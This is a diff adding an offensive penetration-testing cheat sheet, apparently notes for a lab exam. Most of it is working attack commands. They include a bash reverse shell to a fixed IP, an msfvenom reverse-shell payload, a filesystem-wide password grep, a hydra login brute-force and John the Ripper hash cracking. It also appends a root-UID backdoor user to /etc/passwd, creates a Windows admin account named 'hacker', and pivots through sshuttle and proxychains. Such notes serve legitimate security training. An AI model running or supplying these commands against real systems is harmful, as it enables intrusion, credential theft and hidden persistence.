@@ -1,0 +1,99 @@
+
+LINUX finding Files
+
+grep -rnw '/' -e 'password'
+
+grep -rnw '/' -e 'password' 2>/dev/null
+
+
+python2 -m SimpleHTTPServer <Port>
+Creates a web server listening on a particular port using the current working directory
+--> Can easily be used for http filetransfers
+
+
+!!=== Getting a PTY shell from an ordinary shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+Monitoring incoming ICMP packets (ping)
+sudo tcpdump -nni tap0 -e icmp[icmptype] == 8
+
+Monitoring traffic with a particular host and write it to a file
+tcpdump -i tap0 -w out.pcap host IP-ADDRESS
+tcpdump -w out.pcap host IP-ADDRESS
+tcpdump host IP-ADDRESS -w 218.pcap -s 0
+# -s 0 to capture the entire packet
+
+Arp requests of particular host
+tcpdump -nnti tap0 arp and host IP-ADDRESS
+
+
+
+Python reverse SHELL
+
+Bash reverse shell
+bash -i >& /dev/tcp/10.11.0.243/443 0>&1
+
+
+mysql
+mysql -u root -p -h 192.168.34.53
+
+
+JOHN:
+john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump --format=NT
+
+similar to Hashcat, JTR will store cracked hashes in a pot file.  Retrieve these cracked passwords by passing it the --show passwd
+
+
+
+Directories in Path variable
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=1234 CMD=/bin/sh PrependChrootBreak=true --smallest -f python -v payload -b '\x09\x0a\x0b\x0c\x0d\x20\xff'
+
+-v payload defines the variable name
+
+
+HYRDA POST login bruteforce
+
+hydra <target-ip> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&user=^USER^&pass=^PASS^:Login failed!" -l root@localhost  -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -t 30 -w 30 -I
+
+
+Permanently listen on a port
+while true; do nc -lvp 50000; done
+
+
+Creating a password hash
+perl -e 'print crypt("<password>", "<SALT"). "\n"'
+perl -e 'print crypt("password", "AA"). "\n"'
+
+
+add to passwd to create a user with password: 'password'
+myroot:AA6tQYSfGxd/A:0:0:me:/root/:/bin/bash
+
+myroot:AA6tQYSfGxd/A:0:0:me:/root/:/bin/bash >> /etc/passwd
+
+ADDING Windows user
+net user hacker hacker /add
+net localgroup Administrators hacker /add
+net localgroup Administrators "Remote Desktop Users" hacker /add
+
+rDesktop screen size:
+
+rdesktop -u administrator -p password -g 80% <IP>
+
+
+
+===========PIVOTING
+
+Needs ssh enabled and credentials on the "router"
+sshuttle -r remoteuser@10.11.1.1 10.1.1.0/24
+
+sshuttle routes any traffic to 10.1.1.0/24 over 10.11.1.1
+
+==== proxychains =====
+
+proxychains gobuster -u http://10.1.1.1/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -l 2>/dev/nul
